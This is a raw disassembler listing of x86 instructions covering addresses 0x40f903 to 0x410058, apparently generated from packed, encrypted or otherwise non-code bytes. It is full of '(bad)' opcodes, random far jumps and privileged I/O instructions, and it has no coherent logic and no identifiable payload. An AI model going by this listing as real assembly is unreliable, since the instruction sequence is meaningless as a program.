  40f903:	adc    DWORD PTR [edi+0x4c],esi
  40f906:	sub    eax,0x2efd6248
  40f90b:	(bad)  
  40f90c:	ficomp WORD PTR [eax+0x510d40e]
  40f912:	xor    edi,ebx
  40f914:	and    al,0x44
  40f916:	bound  edi,QWORD PTR [ebp+0x47]
  40f919:	xor    al,bl
  40f91b:	or     al,0x16
  40f91d:	xor    al,0x11
  40f91f:	inc    ebp
  40f920:	pop    esi
  40f921:	call   0xcd2e6535
  40f926:	(bad)  
  40f927:	stos   DWORD PTR es:[edi],eax
  40f928:	sti    
  40f929:	or     dl,BYTE PTR ss:[ecx+0x48ec4aae]
  40f930:	test   DWORD PTR [ebx-0x34f138a2],esp
  40f936:	pop    es
  40f937:	out    0xe5,al
  40f939:	xor    al,0x2f
  40f93b:	daa    
  40f93c:	pop    ds
  40f93d:	mov    cl,0xf4
  40f93f:	ds scas eax,DWORD PTR es:[edi]
  40f941:	mov    edx,0xc8abcfb3
  40f946:	shl    BYTE PTR [ecx+0x7e],0xa0
  40f94a:	sti    
  40f94b:	mov    cl,0x1c
  40f94d:	ins    DWORD PTR es:[edi],dx
  40f94e:	leave  
  40f94f:	in     eax,dx
  40f950:	add    ebp,edi
  40f952:	rol    BYTE PTR [eax],cl
  40f954:	and    edx,DWORD PTR [ebp-0x830bbab]
  40f95a:	jp     0x40f93c
  40f95c:	push   esi
  40f95d:	fsubp  st(5),st
  40f95f:	(bad)  
  40f961:	test   ah,bl
  40f963:	dec    esp
  40f964:	imul   esi,DWORD PTR [edx+0x1b],0x7db89f10
  40f96b:	sbb    ecx,DWORD PTR [ecx]
  40f96d:	jne    0x40f95b
  40f96f:	scas   eax,DWORD PTR es:[edi]
  40f970:	mov    bh,0x39
  40f972:	iret   
  40f973:	or     eax,0x42d9a008
  40f978:	ror    DWORD PTR [esi-0x65335a5b],1
  40f97e:	cwde   
  40f97f:	adc    edx,edx
  40f981:	repz repnz sbb eax,0x1ccb554b
  40f988:	sub    BYTE PTR [eax],0xaa
  40f98b:	(bad)  [ebp+0x4b]
  40f98e:	pop    ds
  40f98f:	jp     0x40fa00
  40f991:	stc    
  40f992:	iret   
  40f993:	sub    al,0x1f
  40f995:	xchg   ebp,eax
  40f996:	ret    
  40f997:	adc    BYTE PTR [ecx-0x3c],cl
  40f99a:	popa   
  40f99b:	mul    ebx
  40f99d:	je     0x40fa0e
  40f99f:	call   0x42d9775d
  40f9a4:	jae    0x40f9ca
  40f9a6:	jb     0x40f948
  40f9a8:	cs jl  0x40fa06
  40f9ab:	inc    edx
  40f9ac:	sbb    edx,DWORD PTR [ebx]
  40f9ae:	shr    DWORD PTR [edi+0x30],1
  40f9b1:	mov    ah,0x7a
  40f9b3:	or     eax,esp
  40f9b5:	and    eax,0x6fc76597
  40f9ba:	fcomp  QWORD PTR [ebx-0x24]
  40f9bd:	nop
  40f9be:	pcmpeqd mm6,QWORD PTR [ecx+eiz*8+0x46]
  40f9c3:	outs   dx,DWORD PTR ds:[esi]
  40f9c4:	or     bl,BYTE PTR ds:0xa1eac2e6
  40f9ca:	pusha  
  40f9cb:	shl    BYTE PTR [edi],0xef
  40f9ce:	inc    edx
  40f9cf:	adc    al,0xeb
  40f9d1:	repnz xchg esp,eax
  40f9d3:	mov    esp,DWORD PTR [esi+0x35]
  40f9d6:	fs int 0xe2
  40f9d9:	mov    esi,edi
  40f9db:	adc    DWORD PTR [ebp-0x437ae3b2],edi
  40f9e1:	jo     0x40f9d0
  40f9e3:	fist   DWORD PTR [edx+0x4d]
  40f9e6:	push   eax
  40f9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e8:	fsub   DWORD PTR [ebp+edx*2+0x57]
  40f9ec:	jge    0x40fa3b
  40f9ee:	push   0xffffffb5
  40f9f0:	add    edi,DWORD PTR [ecx+0x15]
  40f9f3:	xor    BYTE PTR [esi-0x3e3ce608],0x56
  40f9fa:	imul   eax,ecx,0x77
  40f9fd:	xor    DWORD PTR [ebx+ecx*4-0x25],ecx
  40fa01:	pop    ss
  40fa02:	jl     0x40fa59
  40fa04:	cmp    DWORD PTR [eax-0x25],eax
  40fa07:	aas    
  40fa08:	fimul  DWORD PTR [edx-0x70cc9886]
  40fa0e:	sbb    esp,esp
  40fa10:	xchg   ecx,ebx
  40fa12:	stos   DWORD PTR es:[edi],eax
  40fa13:	push   ds
  40fa14:	xlat   BYTE PTR ds:[ebx]
  40fa15:	adc    BYTE PTR [ecx],0x20
  40fa18:	adc    bl,BYTE PTR [edx]
  40fa1a:	es fwait
  40fa1c:	jle    0x40fa2f
  40fa1e:	add    eax,0xc05c565c
  40fa23:	mov    eax,0x3c2d118f
  40fa28:	dec    esi
  40fa29:	cmp    bl,BYTE PTR [esi+ecx*2-0x12]
  40fa2d:	cmp    edi,DWORD PTR [ecx+0x1ac9848d]
  40fa33:	aas    
  40fa34:	pop    esp
  40fa35:	cdq    
  40fa36:	(bad)  
  40fa37:	mov    esp,0x2c85781e
  40fa3c:	cmp    eax,0x6c9f86bd
  40fa41:	jg     0x40fa0f
  40fa43:	gs pop ebp
  40fa45:	std    
  40fa46:	push   ss
  40fa47:	retf   
  40fa48:	pop    es
  40fa49:	sbb    ah,BYTE PTR [ecx+0x449810bd]
  40fa4f:	lahf   
  40fa50:	mov    cl,0x89
  40fa52:	jp     0x40faac
  40fa54:	inc    edx
  40fa55:	loop   0x40fa86
  40fa57:	pop    ss
  40fa58:	inc    esp
  40fa59:	std    
  40fa5a:	dec    ecx
  40fa5b:	lea    ebp,[edx]
  40fa5d:	push   esi
  40fa5e:	pusha  
  40fa5f:	ins    BYTE PTR es:[edi],dx
  40fa60:	iret   
  40fa61:	inc    edx
  40fa62:	xchg   esp,eax
  40fa63:	clc    
  40fa64:	test   BYTE PTR [ebp+ebp*2-0x7c],0xd0
  40fa69:	sti    
  40fa6a:	sti    
  40fa6b:	adc    eax,0x70744dbb
  40fa70:	mov    ebx,0x5cc677a7
  40fa75:	loop   0x40fae2
  40fa77:	mov    bh,0xea
  40fa79:	mov    ebx,0xc4019348
  40fa7e:	ror    ch,1
  40fa80:	ss sub al,0xde
  40fa83:	mov    al,0xcb
  40fa85:	push   esi
  40fa86:	jg     0x40fae9
  40fa88:	cmp    eax,0x7a91f65e
  40fa8d:	and    BYTE PTR [esi+0x54],al
  40fa90:	(bad)  
  40fa91:	cs fwait
  40fa93:	es arpl ax,dx
  40fa96:	xchg   edx,eax
  40fa97:	mov    bh,0x40
  40fa99:	out    dx,eax
  40fa9a:	push   edi
  40fa9b:	and    BYTE PTR [ecx],dl
  40fa9d:	jnp    0x40fa39
  40fa9f:	adc    BYTE PTR [eax],ah
  40faa1:	je     0x40fadd
  40faa3:	push   esp
  40faa4:	sbb    ah,bl
  40faa6:	js     0x40fa7d
  40faa8:	push   ds
  40faa9:	push   ecx
  40faaa:	mov    ds:0x310431e6,eax
  40faaf:	sub    al,0xc5
  40fab1:	mov    bl,0x93
  40fab3:	jae    0x40fa98
  40fab5:	mov    DWORD PTR [ecx+esi*2-0x72],esi
  40fab9:	fwait
  40faba:	std    
  40fabb:	jne    0x40fa81
  40fabd:	xor    eax,0x5e54bc33
  40fac2:	je     0x40fafa
  40fac4:	mov    edx,0xc0fd7301
  40fac9:	call   0x6bdd:0xd4f89162
  40fad0:	dec    edx
  40fad1:	jnp    0x40facb
  40fad3:	push   ss
  40fad4:	sbb    BYTE PTR [ecx],bl
  40fad6:	dec    eax
  40fad7:	xchg   esi,eax
  40fad8:	and    ecx,edx
  40fada:	adc    al,0x3d
  40fadc:	popf   
  40fadd:	hlt    
  40fade:	jne    0x40fab7
  40fae0:	jg     0x40fb1b
  40fae2:	jge    0x40fa70
  40fae4:	jne    0x40fa92
  40fae6:	and    eax,0xd701348a
  40faeb:	mov    ebp,0xfa26ff6b
  40faf0:	je     0x40fb43
  40faf2:	mov    BYTE PTR [edi],ch
  40faf4:	dec    ebx
  40faf5:	mov    ch,0x7f
  40faf7:	popf   
  40faf8:	rol    edx,1
  40fafa:	dec    esp
  40fafb:	pop    ds
  40fafc:	sub    al,0x1d
  40fafe:	daa    
  40faff:	dec    edi
  40fb00:	ja     0x40fb27
  40fb02:	add    al,BYTE PTR [edi+0x56]
  40fb05:	xchg   ecx,eax
  40fb06:	jb     0x40fa97
  40fb08:	stc    
  40fb09:	jle    0x40fb1c
  40fb0b:	mov    dl,0x95
  40fb0d:	std    
  40fb0e:	xchg   esp,eax
  40fb0f:	out    dx,al
  40fb10:	out    0xb4,al
  40fb12:	movups xmm2,XMMWORD PTR [esi]
  40fb15:	cdq    
  40fb16:	adc    dl,BYTE PTR [ecx+0x3046fc4e]
  40fb1c:	inc    ebp
  40fb1d:	outs   dx,DWORD PTR ds:[esi]
  40fb1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb1f:	loopne 0x40fb41
  40fb21:	in     al,dx
  40fb22:	outs   dx,DWORD PTR ds:[esi]
  40fb23:	cmp    edi,eax
  40fb25:	(bad)  [eax+0x496a8260]
  40fb2b:	xchg   esp,eax
  40fb2c:	icebp  
  40fb2d:	mov    dh,cl
  40fb2f:	shl    DWORD PTR [edx-0xa],0x7d
  40fb33:	push   0x5d
  40fb35:	out    dx,al
  40fb36:	int    0x57
  40fb38:	mov    bh,0x96
  40fb3a:	push   esp
  40fb3b:	jb     0x40fb1b
  40fb3d:	pop    ebx
  40fb3e:	retf   
  40fb3f:	sbb    eax,0xa6a5558f
  40fb44:	inc    edi
  40fb45:	repnz out dx,eax
  40fb47:	outs   dx,BYTE PTR ds:[esi]
  40fb48:	repnz and al,0x30
  40fb4b:	jmp    0x40fb8e
  40fb4d:	pop    ebp
  40fb4e:	pop    esi
  40fb4f:	add    al,0x9
  40fb51:	jo     0x40fbc7
  40fb53:	push   0xffffffc7
  40fb55:	xor    bh,BYTE PTR [ecx-0x3c]
  40fb58:	iret   
  40fb59:	inc    eax
  40fb5a:	loope  0x40fae4
  40fb5c:	dec    ecx
  40fb5d:	sub    dh,BYTE PTR [ebx-0xf]
  40fb60:	or     eax,0xac1f0e8b
  40fb65:	sbb    BYTE PTR [ebp-0x2fdef4f5],cl
  40fb6b:	repnz push es
  40fb6d:	outs   dx,BYTE PTR ds:[esi]
  40fb6e:	and    esi,DWORD PTR [ebx]
  40fb70:	cdq    
  40fb71:	push   ss
  40fb72:	cmp    ebx,DWORD PTR [ecx+edx*4+0x5c]
  40fb76:	jns    0x40fb62
  40fb78:	adc    BYTE PTR [edx],ch
  40fb7a:	bound  ebx,QWORD PTR [edi]
  40fb7c:	sub    ah,BYTE PTR [edx-0x1e35edc8]
  40fb82:	loop   0x40fb16
  40fb84:	mov    al,ds:0xbf9551cf
  40fb89:	clc    
  40fb8a:	xor    edx,esp
  40fb8c:	xchg   ebp,eax
  40fb8d:	or     edx,DWORD PTR [edx]
  40fb8f:	ret    
  40fb90:	push   edx
  40fb91:	adc    DWORD PTR [ebp+0x60dc27a0],ebx
  40fb97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb98:	cmp    eax,0x50485836
  40fb9d:	sub    edx,eax
  40fb9f:	out    dx,eax
  40fba0:	or     bl,BYTE PTR ds:0x83e91edc
  40fba6:	ins    BYTE PTR es:[edi],dx
  40fba7:	jl     0x40fb31
  40fba9:	mov    dl,0x7c
  40fbab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbac:	dec    ecx
  40fbad:	fs dec ecx
  40fbaf:	inc    esi
  40fbb0:	mov    ecx,0x7ea088d2
  40fbb5:	cmp    eax,ecx
  40fbb7:	push   esp
  40fbb8:	in     eax,0x72
  40fbba:	sbb    BYTE PTR [ecx],cl
  40fbbc:	mov    edi,0xf4f67e18
  40fbc1:	sbb    eax,0x16958de
  40fbc6:	(bad)  
  40fbc7:	jb     0x40fb7a
  40fbc9:	cmp    ah,BYTE PTR [esi+0x5d4af6b9]
  40fbcf:	cmp    al,0x2
  40fbd1:	push   esi
  40fbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd3:	pop    es
  40fbd4:	inc    ecx
  40fbd5:	pop    ebx
  40fbd6:	mov    DWORD PTR [ebp+0x79f6cabd],eax
  40fbdc:	inc    esp
  40fbdd:	mov    ecx,ss
  40fbdf:	popa   
  40fbe0:	mov    ds:0x9e0335b0,eax
  40fbe5:	enter  0xc01e,0xfe
  40fbe9:	jne    0x40fc4c
  40fbeb:	jae    0x40fc58
  40fbed:	jl     0x40fb70
  40fbef:	add    BYTE PTR [ebx-0x33],dl
  40fbf2:	aad    0x1d
  40fbf4:	lea    edi,[ebx]
  40fbf6:	jecxz  0x40fb7a
  40fbf8:	call   0x7c7ebd92
  40fbfd:	repnz inc edi
  40fbff:	push   esi
  40fc00:	inc    edi
  40fc01:	xor    al,0x16
  40fc03:	sbb    eax,0x74a437cf
  40fc08:	push   esp
  40fc09:	scas   eax,DWORD PTR es:[edi]
  40fc0a:	std    
  40fc0b:	fs push ebp
  40fc0d:	dec    esi
  40fc0e:	ja     0x40fb97
  40fc10:	pusha  
  40fc11:	jbe    0x40fc22
  40fc13:	pop    ecx
  40fc14:	push   0xb2a7eb29
  40fc19:	imul   ebx,DWORD PTR [edi+0xe],0x51
  40fc1d:	test   BYTE PTR [edi+eiz*1-0x48],al
  40fc21:	or     al,0xf5
  40fc23:	retf   0x385a
  40fc26:	xchg   esp,eax
  40fc27:	mov    DWORD PTR [eax+ecx*1+0x65],edx
  40fc2b:	sbb    ch,BYTE PTR [esi+0x2e5e889e]
  40fc31:	mov    ss:0x253b64c6,eax
  40fc37:	and    eax,DWORD PTR ds:[edi]
  40fc3a:	jl     0x40fc3e
  40fc3c:	test   al,0x85
  40fc3e:	call   0x4b4ede05
  40fc43:	out    dx,eax
  40fc44:	aas    
  40fc45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc46:	imul   esi,DWORD PTR [ebp-0xa9fe6ca],0xffffff91
  40fc4d:	scas   al,BYTE PTR es:[edi]
  40fc4e:	lahf   
  40fc4f:	xor    al,BYTE PTR [ebx]
  40fc51:	int3   
  40fc52:	jecxz  0x40fc6a
  40fc54:	cdq    
  40fc55:	xor    edi,eax
  40fc57:	iret   
  40fc58:	mov    bh,0x15
  40fc5a:	ds sahf 
  40fc5c:	mov    DWORD PTR [edx-0x58],edi
  40fc5f:	mov    esp,0x56c69e3e
  40fc64:	jmp    0x13bc2682
  40fc69:	or     al,0xdc
  40fc6b:	push   ds
  40fc6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc6e:	test   BYTE PTR [edi],al
  40fc70:	or     eax,0xc9911cb5
  40fc75:	dec    eax
  40fc76:	pushf  
  40fc77:	or     BYTE PTR [edi+0x7b],dl
  40fc7a:	popf   
  40fc7b:	outs   dx,BYTE PTR ds:[esi]
  40fc7c:	outs   dx,BYTE PTR ds:[esi]
  40fc7d:	sar    esi,1
  40fc7f:	mov    bl,0xc9
  40fc81:	pop    ds
  40fc82:	shr    BYTE PTR [esi+0x30],0x8
  40fc86:	cwde   
  40fc87:	and    BYTE PTR [ebp+0x7b5afd3e],ch
  40fc8d:	mov    ebp,0x50cd0f11
  40fc92:	loop   0x40fc7f
  40fc94:	pop    ebx
  40fc95:	xchg   DWORD PTR [esi-0x638936c8],edi
  40fc9b:	pop    edi
  40fc9c:	and    edx,DWORD PTR [ebx-0x21]
  40fc9f:	mov    eax,ds:0x40712f1b
  40fca4:	and    edi,edi
  40fca6:	ins    DWORD PTR es:[edi],dx
  40fca7:	jmp    0x40fcf2
  40fca9:	cwde   
  40fcaa:	push   ds
  40fcab:	cmp    eax,0x97a09b70
  40fcb0:	jno    0x40fd0e
  40fcb2:	sbb    ebx,DWORD PTR [ebx+esi*4]
  40fcb5:	mov    bl,0x4e
  40fcb7:	add    edx,DWORD PTR [ecx]
  40fcb9:	inc    ecx
  40fcba:	sub    eax,0xbc445378
  40fcbf:	test   eax,0xfbfa7a7c
  40fcc4:	push   cs
  40fcc5:	stc    
  40fcc6:	add    al,0xa8
  40fcc8:	ret    
  40fcc9:	jg     0x40fd2c
  40fccb:	daa    
  40fccc:	adc    esp,DWORD PTR [esi]
  40fcce:	fild   QWORD PTR [esi+0x5e]
  40fcd1:	mov    bl,0x17
  40fcd3:	inc    edx
  40fcd4:	iret   
  40fcd5:	jne    0x40fc81
  40fcd7:	cmp    al,0xa
  40fcd9:	push   ebp
  40fcda:	shl    DWORD PTR [ebp+0x7b31df07],cl
  40fce0:	and    eax,0x714af9d7
  40fce5:	add    al,0xe4
  40fce7:	push   edx
  40fce8:	les    edx,FWORD PTR [ebx+eiz*4+0x3e640e61]
  40fcef:	fimul  DWORD PTR [esi+0x35]
  40fcf2:	mov    cl,0x12
  40fcf4:	cs xor esp,0x1b249a20
  40fcfb:	jnp    0x40fcbd
  40fcfd:	xchg   BYTE PTR [ecx],cl
  40fcff:	ja     0x40fcbd
  40fd01:	jne    0x40fd13
  40fd03:	jno    0x40fd4c
  40fd05:	in     eax,0xf5
  40fd07:	adc    edi,DWORD PTR [ebx+0x4daea708]
  40fd0d:	(bad)
  40fd11:	xor    eax,DWORD PTR [esp+edx*8-0x34]
  40fd15:	mov    bh,0x74
  40fd17:	shl    BYTE PTR [edx+edi*1+0x3f],cl
  40fd1b:	dec    ecx
  40fd1c:	cld    
  40fd1d:	icebp  
  40fd1e:	popf   
  40fd1f:	fbld   TBYTE PTR [eax]
  40fd21:	popa   
  40fd22:	shl    al,cl
  40fd24:	mov    DWORD PTR cs:[ebp+0x10],edi
  40fd28:	xlat   BYTE PTR ds:[ebx]
  40fd29:	lods   eax,DWORD PTR ds:[esi]
  40fd2a:	js     0x40fd99
  40fd2c:	or     dh,BYTE PTR [edi+0x5]
  40fd2f:	and    ch,BYTE PTR [esi+0x1bfc41f5]
  40fd35:	and    eax,0xb67765dc
  40fd3a:	mov    eax,ds:0x75b25f8f
  40fd3f:	xchg   esi,eax
  40fd40:	mov    al,ds:0x19fe9cc0
  40fd45:	or     al,0xf0
  40fd47:	ss (bad) 
  40fd49:	loop   0x40fd4a
  40fd4b:	push   esi
  40fd4c:	cmp    cl,cl
  40fd4e:	fidiv  DWORD PTR [esi-0x77aee69f]
  40fd54:	rcl    edi,1
  40fd56:	adc    dl,0x29
  40fd59:	call   0xb10a:0x61656bba
  40fd60:	cmc    
  40fd61:	fwait
  40fd62:	jp     0x40fd06
  40fd64:	and    eax,0xecaa6754
  40fd69:	sbb    DWORD PTR [ebx],0x7e3afa47
  40fd6f:	fwait
  40fd70:	mov    dh,dh
  40fd72:	push   ds
  40fd73:	xchg   BYTE PTR [esi],cl
  40fd75:	xchg   ebx,eax
  40fd76:	and    al,0xbd
  40fd78:	push   eax
  40fd79:	add    BYTE PTR [esi-0xe],dl
  40fd7c:	rol    BYTE PTR [esi-0x55c03b48],1
  40fd82:	lea    edx,[ecx-0xb]
  40fd85:	aam    0x92
  40fd87:	aam    0xa2
  40fd89:	xor    ecx,DWORD PTR [esi+edi*1-0xe]
  40fd8d:	inc    ebx
  40fd8e:	xor    dl,dh
  40fd90:	pop    edi
  40fd91:	cs sahf 
  40fd93:	(bad)  
  40fd94:	in     eax,dx
  40fd95:	and    eax,0x898fa35e
  40fd9a:	ret    
  40fd9b:	jmp    0xbda1:0xf9ad61cd
  40fda2:	or     eax,0xe7397df8
  40fda7:	shr    DWORD PTR [ecx],0xd6
  40fdaa:	adc    eax,0xb6d799c
  40fdaf:	fimul  DWORD PTR [eax-0x108db5a3]
  40fdb5:	jl     0x40fe31
  40fdb7:	mov    ch,0x72
  40fdb9:	and    eax,0xb5808188
  40fdbe:	sub    DWORD PTR [edi+0x75a79e3d],0xc3fe15b6
  40fdc8:	cld    
  40fdc9:	xlat   BYTE PTR ds:[ebx]
  40fdca:	sub    esi,ecx
  40fdcc:	and    eax,0xdb1efb6
  40fdd1:	sbb    esp,DWORD PTR [ecx]
  40fdd3:	data16 sub bh,bl
  40fdd6:	xchg   esi,eax
  40fdd7:	lea    edi,[ebx-0x49885380]
  40fddd:	jecxz  0x40fe1c
  40fddf:	(bad)  
  40fde0:	adc    BYTE PTR [edx+eiz*1+0x15c9ca5b],bh
  40fde7:	push   0x362002a7
  40fdec:	rcr    DWORD PTR [edx-0x4f2a0fe0],0xb0
  40fdf3:	icebp  
  40fdf4:	mov    BYTE PTR [ecx+0x468640ee],bl
  40fdfa:	sar    BYTE PTR [edx],0x3c
  40fdfd:	pop    edi
  40fdfe:	jg     0x40fe0d
  40fe00:	push   edx
  40fe01:	ins    DWORD PTR es:[edi],dx
  40fe02:	js     0x40fd98
  40fe04:	bound  edi,QWORD PTR [edi-0x939feef]
  40fe0a:	mov    ebp,0xae95d7f6
  40fe0f:	inc    esi
  40fe10:	inc    esp
  40fe11:	mov    ah,0x52
  40fe13:	in     al,0x3a
  40fe15:	enter  0xf587,0x17
  40fe19:	mov    bl,0x18
  40fe1b:	in     al,0x87
  40fe1d:	std    
  40fe1e:	sub    eax,0x98ccc1c6
  40fe23:	std    
  40fe24:	or     ecx,DWORD PTR [edx+ebx*4]
  40fe27:	mov    ebp,0x1ef897df
  40fe2c:	jae    0x40fea7
  40fe2e:	lds    ebx,FWORD PTR [ecx-0x12]
  40fe31:	dec    ebp
  40fe32:	jge    0x40fe4a
  40fe34:	lahf   
  40fe35:	push   edi
  40fe36:	sub    eax,0x691e02f6
  40fe3b:	aad    0x78
  40fe3d:	add    ch,dh
  40fe3f:	dec    ebp
  40fe40:	pop    edi
  40fe41:	retf   0x1821
  40fe44:	fisttp DWORD PTR [edx]
  40fe46:	sub    DWORD PTR [esp+eax*1],esi
  40fe49:	mov    dl,0x3e
  40fe4b:	add    ah,dl
  40fe4d:	dec    ecx
  40fe4e:	popa   
  40fe4f:	adc    dl,dh
  40fe51:	je     0x40fe0c
  40fe53:	rcr    BYTE PTR [edi+0x5caeec4c],0xf5
  40fe5a:	ins    DWORD PTR es:[edi],dx
  40fe5b:	mov    BYTE PTR [ecx+0x4e7ae684],ch
  40fe61:	adc    eax,0x3893a4e4
  40fe66:	jge    0x40feb2
  40fe68:	(bad)  
  40fe69:	sbb    al,BYTE PTR [edi]
  40fe6b:	sub    bh,BYTE PTR [ebp-0x236774a5]
  40fe71:	or     al,0xb1
  40fe73:	add    edi,esp
  40fe75:	fwait
  40fe76:	outs   dx,BYTE PTR ds:[esi]
  40fe77:	cwde   
  40fe78:	jecxz  0x40fe64
  40fe7a:	push   esp
  40fe7b:	sbb    eax,0x8e8e2013
  40fe80:	shl    BYTE PTR [edi],1
  40fe82:	js     0x40fe44
  40fe84:	xchg   edi,eax
  40fe85:	or     dh,BYTE PTR [edi-0x1107ec0a]
  40fe8b:	cmp    DWORD PTR [esi+0x78],0x46e470e2
  40fe92:	js     0x40fe95
  40fe94:	mov    cl,0x79
  40fe96:	adc    edx,DWORD PTR [edx+0x33acf778]
  40fe9c:	jge    0x40fe7c
  40fe9e:	rcl    BYTE PTR [esi+0x29a3e2b7],0xb2
  40fea5:	xor    eax,0x2d258337
  40feaa:	fs es sti 
  40fead:	retf   0xa104
  40feb0:	push   0x15
  40feb2:	pop    esi
  40feb3:	cmp    esp,DWORD PTR [edi+0x5d]
  40feb6:	inc    eax
  40feb7:	lock cmp al,0xae
  40feba:	rcl    DWORD PTR [ecx+ecx*2-0x385b131f],0xe7
  40fec2:	sub    bh,BYTE PTR [ebp+0x1c]
  40fec5:	or     ah,dl
  40fec7:	imul   esp,DWORD PTR [edi-0x2e],0xffffff8f
  40fecb:	and    edx,DWORD PTR [ecx-0x29e3c58]
  40fed1:	sub    DWORD PTR [eax+eax*4-0x2df593b5],0xfffffff1
  40fed9:	cwde   
  40feda:	mov    ecx,0x903fc36c
  40fedf:	push   0x348d6928
  40fee4:	xchg   ebp,eax
  40fee5:	mov    bh,BYTE PTR [ecx-0x241901ea]
  40feeb:	pushf  
  40feec:	inc    edx
  40feed:	outs   dx,DWORD PTR ds:[esi]
  40feee:	inc    eax
  40feef:	jg     0x40feac
  40fef1:	push   ebx
  40fef2:	jecxz  0x40fe77
  40fef4:	and    ah,BYTE PTR [ebx]
  40fef6:	sub    DWORD PTR [eax-0x28],edi
  40fef9:	xchg   edi,eax
  40fefa:	and    al,0x6d
  40fefc:	outs   dx,BYTE PTR ds:[esi]
  40fefd:	jl     0x40ff00
  40feff:	(bad)  
  40ff00:	dec    ebx
  40ff01:	add    DWORD PTR [esi],eax
  40ff03:	mov    ecx,DWORD PTR [ebx-0xdcf6170]
  40ff09:	sbb    al,0x2b
  40ff0b:	mov    ?,eax
  40ff0d:	mov    ?,WORD PTR [ebx+0x1b]
  40ff10:	test   al,0xb3
  40ff12:	xor    al,0x45
  40ff14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff15:	cdq    
  40ff16:	rcr    DWORD PTR [esp+eiz*8+0x961aab2],0xae
  40ff1e:	outs   dx,BYTE PTR ds:[esi]
  40ff1f:	fidiv  DWORD PTR [edx+0x5e]
  40ff22:	sub    eax,0x8f36a8b6
  40ff27:	cmp    ch,BYTE PTR [ebp-0x7c6b7c28]
  40ff2d:	sbb    esp,DWORD PTR [esi-0x4f41d34a]
  40ff33:	mov    ah,0x18
  40ff35:	es dec eax
  40ff37:	sahf   
  40ff38:	bound  eax,QWORD PTR [ecx-0x308b1f51]
  40ff3e:	cmp    ebx,ebx
  40ff40:	mov    ds:0x410d0207,al
  40ff45:	int    0xaf
  40ff47:	(bad)  
  40ff48:	out    0x3b,eax
  40ff4a:	emms   
  40ff4c:	xor    al,0x18
  40ff4e:	test   BYTE PTR [ecx-0x15a236c],al
  40ff54:	dec    esi
  40ff55:	jecxz  0x40ff58
  40ff57:	lock jns 0x40ffa5
  40ff5a:	in     al,0x33
  40ff5c:	cmp    DWORD PTR [edx],0x95e1dde6
  40ff62:	add    eax,0x654df895
  40ff67:	mov    BYTE PTR [esi],ah
  40ff69:	pop    esp
  40ff6a:	and    ecx,DWORD PTR [edx+edi*2-0x7c41669d]
  40ff71:	pop    esp
  40ff72:	jl     0x40ff4d
  40ff74:	pop    edi
  40ff75:	or     edx,DWORD PTR [eax]
  40ff77:	mov    cl,0xa1
  40ff79:	jno    0x40ff30
  40ff7b:	mov    cl,0xc0
  40ff7d:	inc    edi
  40ff7e:	popf   
  40ff7f:	mov    bl,0xa1
  40ff81:	cmp    eax,0xbdf28742
  40ff86:	push   ecx
  40ff87:	xchg   ebp,eax
  40ff88:	fisttp QWORD PTR [edx+0x14]
  40ff8b:	into   
  40ff8c:	add    eax,0x77a603d2
  40ff91:	pop    ds
  40ff92:	(bad)  
  40ff94:	cmc    
  40ff95:	adc    DWORD PTR [ebx+0x21],0xffffffc2
  40ff99:	lea    ecx,[edi]
  40ff9b:	adc    DWORD PTR [ebx-0x2],esp
  40ff9e:	mov    eax,ds:0x25c092b3
  40ffa3:	mov    bl,0x43
  40ffa5:	adc    eax,0x330ea3d7
  40ffaa:	push   esi
  40ffab:	(bad)  
  40ffac:	shr    BYTE PTR [ebx+0x2f],1
  40ffaf:	add    ch,BYTE PTR [edi]
  40ffb1:	jmp    0x40ff41
  40ffb3:	sub    al,0x2d
  40ffb5:	push   ss
  40ffb6:	mov    bl,0xd9
  40ffb8:	mul    BYTE PTR ds:0x16bed544
  40ffbe:	iret   
  40ffbf:	mov    al,0xb7
  40ffc1:	arpl   WORD PTR [eax],cx
  40ffc3:	dec    edi
  40ffc4:	sbb    al,0xe1
  40ffc6:	ror    DWORD PTR [ecx-0x76c79a99],cl
  40ffcc:	xchg   esp,eax
  40ffcd:	or     BYTE PTR [esi+eax*4],bh
  40ffd0:	mov    dl,0x2c
  40ffd2:	pop    edi
  40ffd3:	jmp    0xa6e2:0x38030366
  40ffda:	push   esp
  40ffdb:	cwde   
  40ffdc:	add    ebx,DWORD PTR [ebx]
  40ffde:	add    eax,0x17cd1db6
  40ffe3:	sub    eax,DWORD PTR [ebx]
  40ffe5:	pop    esp
  40ffe6:	cmp    ebp,DWORD PTR [edi]
  40ffe8:	sbb    al,BYTE PTR [eax-0x37f42f99]
  40ffee:	int    0xd6
  40fff0:	and    BYTE PTR [eax+0x5703d8],dl
  40fff6:	cmp    ecx,esi
  40fff8:	into   
  40fff9:	xor    DWORD PTR [eax],0xaf7dbade
  40ffff:	rol    BYTE PTR [esi-0x5e],cl
  410002:	pusha  
  410003:	xor    al,BYTE PTR [edx]
  410005:	and    eax,0x708ff7f
  41000a:	mov    WORD PTR [eax+edx*2],?
  41000d:	outs   dx,DWORD PTR fs:[esi]
  41000f:	xchg   edx,eax
  410010:	shl    BYTE PTR [ebp-0x11],1
  410013:	sub    DWORD PTR [ecx+0x1af43291],ebx
  410019:	std    
  41001a:	xchg   esi,eax
  41001b:	mov    dh,0x4f
  41001d:	xchg   DWORD PTR [edi+0x3f],edi
  410020:	dec    ebp
  410021:	mov    cl,0x3e
  410023:	xor    DWORD PTR [esi+0x8],edx
  410026:	xor    ch,BYTE PTR [edi-0x78beac]
  41002c:	pop    edi
  41002d:	jg     0x41003a
  41002f:	aam    0xa0
  410031:	xchg   ecx,eax
  410032:	ins    BYTE PTR es:[edi],dx
  410033:	pop    ss
  410034:	lds    esp,FWORD PTR [edx+0x267e3c2]
  41003a:	call   0x2e444b7c
  41003f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410040:	sbb    ch,BYTE PTR ds:0xe03cfa78
  410046:	pop    ss
  410047:	fnstcw WORD PTR ds:0x1289c4bf
  41004d:	mov    ebp,eax
  41004f:	jg     0x41004f
  410051:	push   edx
  410052:	rcl    esi,cl
  410054:	xchg   ebx,eax
  410055:	(bad)  
  410056:	or     al,0x20
  410058:	pushf  
